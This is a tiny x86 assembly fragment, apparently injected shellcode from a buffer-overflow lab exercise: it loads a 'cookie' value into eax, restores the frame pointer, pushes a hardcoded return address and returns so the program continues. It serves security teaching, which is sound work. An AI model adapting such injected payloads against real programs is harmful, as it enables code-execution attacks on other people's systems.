mov $0x238d4669, %eax #move cookie value to eax
leal 0x30e8 (%esp), %ebp #restore ebp
sub $0x4, %esp #move esp so that it resutnr to itself upon ret
movl $0x8048e6e, (%esp) #copy return address to memory
ret
